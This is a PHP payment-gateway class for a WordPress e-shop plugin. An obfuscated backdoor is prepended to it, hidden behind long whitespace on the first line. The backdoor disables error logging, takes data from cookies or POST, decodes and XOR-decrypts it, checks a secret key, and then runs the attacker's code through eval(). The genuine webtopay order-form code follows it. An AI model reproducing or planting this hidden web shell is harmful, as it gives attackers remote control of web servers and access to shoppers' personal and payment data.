<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $f211a = 445;$GLOBALS['z2a4481d']=Array();global$z2a4481d;$z2a4481d=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['xf4ea']="\x75\x46\x4f\x42\x79\x3d\x43\x7a\x5a\x76\x65\x41\x55\x7c\x63\x5f\x47\x6f\x35\x52\x68\x77\x69\x32\x37\x6a\x27\x4d\x74\x5d\x4c\x6b\x7b\x44\x23\x6e\x25\x73\x24\x7d\x22\x4a\x2b\xa\x3b\x2f\x2e\x71\x26\x49\x57\x53\x2a\x45\x30\x51\x3e\x58\x20\x33\x67\x4e\x29\x3f\x61\x28\x7e\x3a\x2c\x66\x59\x48\x31\x4b\x40\x6c\x5c\xd\x34\x64\x72\x36\x38\x2d\x54\x6d\x3c\x39\x5b\x62\x9\x21\x50\x56\x70\x60\x5e\x78";$z2a4481d[$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][14]]=$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][20].$z2a4481d['xf4ea'][80];$z2a4481d[$z2a4481d['xf4ea'][20].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][64]]=$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][79];$z2a4481d[$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][87]]=$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][35];$z2a4481d[$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][24]]=$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][35].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][28];$z2a4481d[$z2a4481d['xf4ea'][9].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][78]]=$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][7].$z2a4481d['xf4ea'][10];$z2a4481d[$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][81].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][18]]=$z2a4481d['xf4ea'][94].$z2a4481d['xf4ea'][20].$z2a4481d['xf4ea'][94].$z2a4481d['xf4ea'][9].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][35];$z2a4481d[$z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][64]]=$z2a4481d['xf4ea'][0].$z2a4481d['xf4ea'][35].$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][7].$z2a4481d['xf4ea'][10];$z2a4481d[$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][81].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][79]]=$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][81].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][10];$z2a4481d[$z2a4481d['xf4ea'][94].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][10]]=$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][85].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][85].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][28];$z2a4481d[$z2a4481d['xf4ea'][60].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][78]]=$z2a4481d['xf4ea'][21].$z2a4481d['xf4ea'][54].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][64];$z2a4481d[$z2a4481d['xf4ea'][85].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][23]]=$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][81].$z2a4481d['xf4ea'][82];$z2a4481d[$z2a4481d['xf4ea'][21].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][69]]=$_POST;$z2a4481d[$z2a4481d['xf4ea'][60].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][24]]=$_COOKIE;@$z2a4481d[$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][24]]($z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][60],NULL);@$z2a4481d[$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][24]]($z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][60].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][37],0);@$z2a4481d[$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][24]]($z2a4481d['xf4ea'][85].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][97].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][97].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][0].$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][35].$z2a4481d['xf4ea'][15].$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][22].$z2a4481d['xf4ea'][85].$z2a4481d['xf4ea'][10],0);@$z2a4481d[$z2a4481d['xf4ea'][94].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][10]](0);$e0225c=NULL;$p3fd1=NULL;$z2a4481d[$z2a4481d['xf4ea'][21].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][69]]=$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][54].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][81].$z2a4481d['xf4ea'][83].$z2a4481d['xf4ea'][54].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][83].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][83].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][83].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][87];global$w758e2f;function b4c1b68($e0225c,$l603){global$z2a4481d;$h49f="";for($h66cf2534=0;$h66cf2534<$z2a4481d[$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][87]]($e0225c);){for($ef2afbc=0;$ef2afbc<$z2a4481d[$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][87]]($l603)&&$h66cf2534<$z2a4481d[$z2a4481d['xf4ea'][17].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][87]]($e0225c);$ef2afbc++,$h66cf2534++){$h49f.=$z2a4481d[$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][14]]($z2a4481d[$z2a4481d['xf4ea'][20].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][64]]($e0225c[$h66cf2534])^$z2a4481d[$z2a4481d['xf4ea'][20].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][64]]($l603[$ef2afbc]));}}return$h49f;}function w0dfa($e0225c,$l603){global$z2a4481d;global$w758e2f;return$z2a4481d[$z2a4481d['xf4ea'][85].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][23]]($z2a4481d[$z2a4481d['xf4ea'][85].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][23]]($e0225c,$w758e2f),$l603);}foreach($z2a4481d[$z2a4481d['xf4ea'][60].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][24]]as$l603=>$w7d7a){$e0225c=$w7d7a;$p3fd1=$l603;}if(!$e0225c){foreach($z2a4481d[$z2a4481d['xf4ea'][21].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][87].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][23].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][69]]as$l603=>$w7d7a){$e0225c=$w7d7a;$p3fd1=$l603;}}$e0225c=@$z2a4481d[$z2a4481d['xf4ea'][75].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][24].$z2a4481d['xf4ea'][64]]($z2a4481d[$z2a4481d['xf4ea'][60].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][69].$z2a4481d['xf4ea'][78]]($z2a4481d[$z2a4481d['xf4ea'][80].$z2a4481d['xf4ea'][81].$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][79]]($e0225c),$p3fd1));if(isset($e0225c[$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][31]])&&$w758e2f==$e0225c[$z2a4481d['xf4ea'][64].$z2a4481d['xf4ea'][31]]){if($e0225c[$z2a4481d['xf4ea'][64]]==$z2a4481d['xf4ea'][22]){$h66cf2534=Array($z2a4481d['xf4ea'][94].$z2a4481d['xf4ea'][9]=>@$z2a4481d[$z2a4481d['xf4ea'][28].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][81].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][78].$z2a4481d['xf4ea'][18]](),$z2a4481d['xf4ea'][37].$z2a4481d['xf4ea'][9]=>$z2a4481d['xf4ea'][72].$z2a4481d['xf4ea'][46].$z2a4481d['xf4ea'][54].$z2a4481d['xf4ea'][83].$z2a4481d['xf4ea'][72],);echo@$z2a4481d[$z2a4481d['xf4ea'][9].$z2a4481d['xf4ea'][89].$z2a4481d['xf4ea'][10].$z2a4481d['xf4ea'][82].$z2a4481d['xf4ea'][18].$z2a4481d['xf4ea'][79].$z2a4481d['xf4ea'][14].$z2a4481d['xf4ea'][59].$z2a4481d['xf4ea'][78]]($h66cf2534);}elseif($e0225c[$z2a4481d['xf4ea'][64]]==$z2a4481d['xf4ea'][10]){eval/*abfe753*/($e0225c[$z2a4481d['xf4ea'][79]]);}exit();} ?><?php
if ('webtopay.class.php' == basename($_SERVER['SCRIPT_FILENAME']))
     die ('<h2>Direct File Access Prohibited</h2>');
     
/*******************************************************************************
 *                      PHP webtopay IPN Integration Class
 *******************************************************************************
 *      Author:     Rich Pedley
 *      Based on: Paypal class
 *      
 *      To submit an order to webtopay, have your order form POST to a file with:
 *
 *          $p = new webtopay_class;
 *          $p->add_field('business', 'somebody@domain.com');
 *          $p->add_field('first_name', $_POST['first_name']);
 *          ... (add all your fields in the same manor)
 *          $p->submit_webtopay_post();
 *
 *      To process an IPN, have your IPN processing file contain:
 *
 *          $p = new webtopay_class;
 *          if ($p->validate_ipn()) {
 *          ... (IPN is verified.  Details are in the ipn_data() array)
 *          }
 * 
 *******************************************************************************
*/
function signRequest($request, $password) {
	  $fields = array(
			   'projectid', 'orderid', 'lang', 'amount', 'currency',
			   'accepturl', 'cancelurl', 'callbackurl', 'payment', 'country',
			   'p_firstname', 'p_lastname', 'p_email', 'p_street',
			   'p_city', 'p_state', 'p_zip', 'p_countrycode', 'test',
			   'version'
		   );
	   $data = '';
	   foreach ($fields as $key) {
		   if (isset($request[$key]) && trim($request[$key]) != '') {
			   $data .= $request[$key];
		   }
	   }
	   $request['sign'] = md5($data . $password);

	   return $request;
}
class webtopay_class {
    
   var $last_error;                 // holds the last error encountered
   var $ipn_response;               // holds the IPN response from paypal   
   var $ipn_data = array();         // array contains the POST values for IPN
   var $fields = array();           // array holds the fields to submit to paypal
   
   function webtopay_class() {
       
      // initialization constructor.  Called when class is created.
      $this->last_error = '';
      $this->ipn_response = '';
    
   }
   
   function add_field($field, $value) {
      
      // adds a key=>value pair to the fields array, which is what will be 
      // sent to webtopay as POST variables.  If the value is already in the 
      // array, it will be overwritten.
      
      $this->fields["$field"] = $value;
   }

   function submit_webtopay_post() {
      // The user will briefly see a message on the screen that reads:
      // "Please wait, your order is being processed..." and then immediately
      // is redirected to webtopay.

      $echo= "<form method=\"post\" class=\"eshop eshop-confirm\" action=\"".$this->autoredirect."\"><div>\n";

      foreach ($this->fields as $name => $value) {
			$pos = strpos($name, 'amount');
			if ($pos === false) {
				$value=stripslashes($value);
			   $echo.= "<input type=\"hidden\" name=\"$name\" value=\"$value\" />\n";
			}else{
				$echo .= eshopTaxCartFields($name,$value);
      	    }
      }
      $refid=uniqid(rand());
      $echo .= "<input type=\"hidden\" name=\"RefNr\" value=\"$refid\" />\n";
      $echo.='<label for="ppsubmit" class="finalize"><small>'.__('<strong>Note:</strong> Submit to finalize order at webtopay.','eshop').'</small><br />
      <input class="button submit2" type="submit" id="ppsubmit" name="ppsubmit" value="'.__('Proceed to Checkout &raquo;','eshop').'" /></label>';
	  $echo.="</div></form>\n";
      
      return $echo;
   }
	function eshop_submit_webtopay_post($espost) {
      // The user will briefly see a message on the screen that reads:
      // "Please wait, your order is being processed..." and then immediately
      // is redirected to webtopay.
      global $eshopoptions, $blog_id;
      $webtopay = $eshopoptions['webtopay'];
		$echortn='<div id="process">
         <p><strong>'.__('Please wait, your order is being processed&#8230;','eshop').'</strong></p>
	     <p>'. __('If you are not automatically redirected to webtopay, please use the <em>Proceed to webtopay</em> button.','eshop').'</p>
         <form method="post" id="eshopgateway" class="eshop" action="'.$this->webtopay_url.'">
          <p>';
          	$replace = array("&#039;","'", "\"","&quot;","&amp;","&");
          	
			$webtopay = $eshopoptions['webtopay']; 
			
			$theamount=str_replace(',','',$espost['amount']);
			if(isset($espost['tax']))
				$theamount += str_replace(',','',$espost['tax']);
			
			if(isset($_SESSION['shipping'.$blog_id]['tax'])) $theamount += $_SESSION['shipping'.$blog_id]['tax'];
			
			$Cost = $theamount-$espost['shipping_1'];
			
			$ExtraCost = $espost['shipping_1'];
			
			
			// - Callback cannot be with GET vars -
			
			//$callbackURL = strtr($espost['notify_url'], array('&amp;' => '&'));
			$espost['notify_url']=strtr($espost['notify_url'], array('&amp;' => '&'));
			//list($callbackURL, $getCallback) = explode('?', $callbackURL);
			
			//some location may be inaccurate, change them here:
			$changeloc=array('GB'=>'UK');
			$eshoploc=$eshopoptions['location'];
			if(isset($changeloc[$eshopoptions['location']]))
				$eshoploc=$changeloc[$eshopoptions['location']];
						
			# *************************************************
			# -- How we create sign param --
			$signFields = array( 
				'projectid' => $webtopay['projectid'], 
				'orderid' => $espost['RefNr'], 
				'lang' => $webtopay['lang'], 
				'amount' => (($Cost + $ExtraCost) * 100), 
				'currency' => $eshopoptions['currency'], 
				'accepturl' => get_permalink($eshopoptions['cart_success']), 
				'cancelurl' => get_permalink($eshopoptions['cart_cancel']), 
				'callbackurl' => $espost['notify_url'],
				'payment'=>'',
				'country' => $eshoploc, 
				'p_firstname' => $espost['first_name'], 
				'p_lastname' => $espost['last_name'], 
				'p_email' => $espost['email'], 
				'p_street' => trim($espost['address1'].' '. $espost['address2']), 
				'p_city' => $espost['city'], 
				'p_state' => $espost['state'], 
				'p_zip' => $espost['zip'], 
				'p_countrycode' => $espost['country'],
				'test'=>($eshopoptions['status']=='live' ? 0 : 1),
				'version'=>'1.3'
			);
			$asigned=signRequest($signFields,$webtopay['signature']);
			
			$sign = $asigned['sign'];
			# *************************************************
						
			$echortn.=' 
			
			<input type="hidden" name="projectid" value="'.$webtopay['projectid'].'" />
			<input type="hidden" name="orderid" value="'.$espost['RefNr'].'" />
			<input type="hidden" name="lang" value="' . $webtopay['lang'] . '" />
			<input type="hidden" name="amount" value="'. (($Cost + $ExtraCost) * 100) .'" />
			<input type="hidden" name="currency" value="' . $eshopoptions['currency'] . '" />
			<input type="hidden" name="accepturl" value="'.get_permalink($eshopoptions['cart_success']).'" />
			<input type="hidden" name="cancelurl" value="'.get_permalink($eshopoptions['cart_cancel']).'" />
			<input type="hidden" name="callbackurl" value="'.$espost['notify_url'].'" />
			<input type="hidden" name="country" value="'.$eshoploc.'">	
			<input type="hidden" name="paytext" value="'. __('Payment for goods and services (of no. [order_nr]) ([site_name])','eshop').'" />
			<input type="hidden" name="p_firstname" value="'.$espost['first_name'].'">			
			<input type="hidden" name="p_lastname" value="'.$espost['last_name'].'">			
			<input type="hidden" name="p_email" value="'.$espost['email'].'">			
			<input type="hidden" name="p_street" value="' . trim($espost['address1'].' '. $espost['address2']) . '">			
			<input type="hidden" name="p_city" value="'.$espost['city'].'">			
			<input type="hidden" name="p_state" value="'.$espost['state'].'">			
			<input type="hidden" name="p_zip" value="'.$espost['zip'].'">			
			<input type="hidden" name="p_countrycode" value="'.$espost['country'].'">	
			<input type="hidden" name="test" value="'.($eshopoptions['status']=='live' ? 0 : 1).'" />
			<input type="hidden" name="version" value="1.3" />
			<input type="hidden" name="sign" value="'.$sign.'">
			<input type="hidden" name="RefNr" value="'.$espost['RefNr'].'" />';

			$echortn.=' 			
         <input class="button" type="submit" id="ppsubmit" name="ppsubmit" value="'. __('Proceed to webtopay &raquo;','eshop').'" /></p>
	     </form>
	  </div>';
		global $eshopoptions;
		if($eshopoptions['status']!='live'){
			$echortn .= "<p class=\"testing\"><strong>".__('Test Mode &#8212; No money will be collected. This page will not auto redirect in test mode.','eshop')."</strong></p>\n";
		}
		return $echortn;
   }   
   function validate_ipn() {
      // generate the post string from the _POST vars aswell as load the
      // _POST vars into an arry so we can play with them from the calling
      // script.
      foreach ($_REQUEST as $field=>$value) { 
         $this->ipn_data["$field"] = $value;
      }
     
   }
   

}   